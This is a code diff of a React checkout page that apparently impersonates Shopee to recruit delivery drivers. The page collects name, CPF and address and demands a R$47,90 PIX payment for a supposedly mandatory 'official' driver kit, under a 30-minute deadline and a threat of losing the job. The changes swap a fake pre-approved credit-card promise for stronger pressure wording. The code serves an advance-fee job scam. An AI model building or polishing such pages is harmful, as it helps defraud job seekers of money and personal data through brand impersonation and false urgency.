@@ -18,12 +18,12 @@ import { useScrollTop } from '@/hooks/use-scroll-top';
 import { API_BASE_URL } from '../lib/api-config';
 import { createPixPayment } from '../lib/payments-api';
 import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';
+import EPIConfirmationModal from '@/components/EPIConfirmationModal';
 import EntregadorCracha from '@/components/EntregadorCracha';
 import QRCodeGenerator from '@/components/QRCodeGenerator';
 
 import kitEpiImage from '../assets/kit-epi-new.webp';
 import pixLogo from '../assets/pix-logo.png';
-import shopeeLogoWhite from '../assets/shopee-logo-white.png';
 
 // Interface para o endereço do usuário
 interface EnderecoUsuario {
@@ -328,14 +328,14 @@ const Entrega: React.FC = () => {
   // Não usamos mais a geração local de códigos PIX
   // Todos os pagamentos serão processados pela API For4Payments
 
-  // Handler para o formulário de endereço - vai direto para pagamento
+  // Handler para o formulário de endereço
   const onSubmitEndereco = async (data: EnderecoFormValues) => {
     try {
       // Salvar endereço completo
       localStorage.setItem('endereco_entrega', JSON.stringify(data));
       
-      // Processar pagamento diretamente, sem popup de confirmação
-      await processarPagamento();
+      // Mostrar o modal de confirmação primeiro
+      setShowConfirmationModal(true);
     } catch (error: any) {
       console.error("Erro ao processar endereço:", error);
       toast({
@@ -346,10 +346,11 @@ const Entrega: React.FC = () => {
     }
   };
   
-  // Função para processar o pagamento diretamente
+  // Função para processar o pagamento após a confirmação
   const processarPagamento = async () => {
     try {
-      // Abrir modal de pagamento diretamente
+      // Fechar o modal de confirmação e abrir o de pagamento
+      setShowConfirmationModal(false);
       setShowPaymentModal(true);
       setIsLoading(true);
       
@@ -641,7 +642,7 @@ const Entrega: React.FC = () => {
                       </div>
                     </div>
                     <p className="mt-4 text-gray-600 text-sm">
-                      Seu cartão Shopee com R$ 1.900,00 de limite de crédito pré-aprovado.
+                      Seu cartão personalizado será liberado após a confirmação do pagamento
                     </p>
                   </div>
                 </div>
@@ -772,7 +773,8 @@ const Entrega: React.FC = () => {
                     <div>
                       <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
                       <p className="text-sm text-gray-700">
-                        Para receber seu equipamento de trabalho e o Cartão salário é necessário o pagamento da taxa de entrega via transportadora no valor de <strong>R$47,90</strong>.
+                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
+                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$47,90</strong>.
                       </p>
                     </div>
                   </div>
@@ -789,9 +791,14 @@ const Entrega: React.FC = () => {
                       </svg>
                     </div>
                     <div>
-                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Finalizar Cadastro".</h4>
+                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
+                      <p className="text-red-700 text-sm mt-1">
+                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
+                        adquirir este kit oficial para exercer a função de entregador Shopee.
+                      </p>
                       <p className="text-red-700 text-sm mt-2">
-                        Ao prosseguir, você se compromete a realizar o pagamento da taxa d entrega do seu cartão e do kit EPI. Caso contrário, perderá o direito à vaga de entregador.
+                        Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
+                        caso contrário, perderá o direito à vaga de entregador.
                       </p>
                       
                       {/* Botão on/off (switch) */}
@@ -821,7 +828,7 @@ const Entrega: React.FC = () => {
                   style={{ height: '50px' }}
                   disabled={!acceptedTerms}
                 >
-                  Finalizar Cadastro
+                  Comprar e Ativar Cadastro
                 </Button>
               </form>
             </div>
@@ -844,26 +851,20 @@ const Entrega: React.FC = () => {
           }
         }}
       >
-        <DialogContent className="!fixed !top-0 !left-1/2 !transform !-translate-x-1/2 !translate-y-0 sm:max-w-md !h-[100vh] !max-h-screen overflow-y-auto !p-0 relative [&>button]:hidden !z-50 !bg-white shadow-lg border-none !rounded-none flex flex-col">
-          {/* O botão X foi removido usando CSS: [&>button]:hidden */}
-          
-          {/* Faixa fixa laranja com logo da Shopee */}
-          <div className="bg-[#EE4E2E] px-4 py-2 flex justify-center items-center w-full h-12 flex-shrink-0">
-            <img 
-              src={shopeeLogoWhite} 
-              alt="Shopee Logo" 
-              className="h-7"
-            />
-          </div>
-          
-          <div className="p-2 flex-1">
+        <DialogContent className="sm:max-w-md h-[100vh] max-h-screen overflow-y-auto p-2">
+          <DialogHeader className="pb-1">
+            <DialogTitle className="text-center text-sm">Pagamento do Kit de Segurança</DialogTitle>
+            <DialogDescription className="text-center text-xs">
+              Finalize o pagamento para ativar seu cadastro Shopee
+            </DialogDescription>
+          </DialogHeader>
           
           {isLoading ? (
-            <div className="flex flex-col items-center justify-center py-8 min-h-[400px]">
+            <div className="flex flex-col items-center justify-center py-8">
               <div className="text-[#E83D22]">
                 <Spinner size="lg" />
               </div>
-              <p className="mt-4 text-gray-600 text-sm">Gerando QR Code para pagamento...</p>
+              <p className="mt-4 text-gray-600">Gerando QR Code para pagamento...</p>
             </div>
           ) : pixInfo ? (
             <div className="space-y-3">
@@ -877,14 +878,14 @@ const Entrega: React.FC = () => {
                   />
                 </div>
                 <div className="flex-grow">
-                  <h3 className="text-base font-medium text-gray-800">Entrega do EPI e Cartão</h3>
-                  <p className="text-lg font-bold text-[#E83D22]">R$ 47,90</p>
+                  <h3 className="text-sm font-medium text-gray-800">Kit de Segurança Oficial</h3>
+                  <p className="text-md font-bold text-[#E83D22]">R$ 47,90</p>
                   
                   <div className="w-full mt-1">
-                    <p className="text-sm text-gray-600">
+                    <p className="text-xs text-gray-600">
                       <span className="font-medium">Nome:</span> {dadosUsuario?.nome}
                     </p>
-                    <p className="text-sm text-gray-600">
+                    <p className="text-xs text-gray-600">
                       <span className="font-medium">CPF:</span> {dadosUsuario?.cpf}
                     </p>
                   </div>
@@ -898,7 +899,7 @@ const Entrega: React.FC = () => {
                     <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                   </svg>
                 </div>
-                <p className="text-sm text-gray-600 font-medium">
+                <p className="text-xs text-gray-600 font-medium">
                   Aguardando pagamento PIX...
                 </p>
               </div>
@@ -929,7 +930,7 @@ const Entrega: React.FC = () => {
                       </svg>
                     </div>
                     <div className="flex flex-col">
-                      <p className="text-sm text-gray-700 font-medium">
+                      <p className="text-xs text-gray-700 font-medium">
                         PIX expira em <span className="text-[#E83D22] font-bold">{formatTime(timeLeft)}</span>
                       </p>
                     </div>
@@ -939,7 +940,7 @@ const Entrega: React.FC = () => {
               
               {/* Código PIX e botão copiar */}
               <div className="h-[20vh]">
-                <p className="text-sm text-gray-600 mb-1 text-center">
+                <p className="text-xs text-gray-600 mb-1 text-center">
                   Copie o código PIX:
                 </p>
                 <div className="relative">
@@ -978,13 +979,12 @@ const Entrega: React.FC = () => {
               
               {/* Instruções */}
               <div className="bg-red-50 p-2 rounded-md border border-red-300">
-                <p className="text-sm text-red-800 text-center">
+                <p className="text-xs text-red-800 text-center">
                   Após o pagamento, retorne a esta página para finalizar o cadastro.
                 </p>
               </div>
             </div>
           ) : null}
-          </div>
         </DialogContent>
       </Dialog>
 
@@ -1023,6 +1023,12 @@ const Entrega: React.FC = () => {
         </DialogContent>
       </Dialog>
       
+      {/* Modal de confirmação para o kit EPI */}
+      <EPIConfirmationModal
+        isOpen={showConfirmationModal}
+        onOpenChange={setShowConfirmationModal}
+        onConfirm={processarPagamento}
+      />
 
       {/* Popup de status do pagamento - aparece 30 segundos após abrir o modal */}
       <Dialog open={showPaymentStatusPopup} onOpenChange={setShowPaymentStatusPopup}>
